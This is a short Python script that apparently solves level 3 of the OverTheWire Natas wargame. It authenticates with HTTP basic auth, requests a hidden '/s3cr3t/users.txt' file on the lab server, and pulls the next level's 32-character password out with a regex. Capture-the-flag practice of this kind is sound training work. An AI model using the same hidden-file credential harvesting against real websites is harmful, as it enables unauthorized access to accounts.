import requests
import re
from requests.auth import HTTPBasicAuth
def solve3(username, password):
    session = requests.session()
    session.auth = HTTPBasicAuth(username, password)
    resp = session.get("http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt")
    pw = re.findall(r'[a-zA-Z0-9]{32}', resp.text)[-1]
    return pw
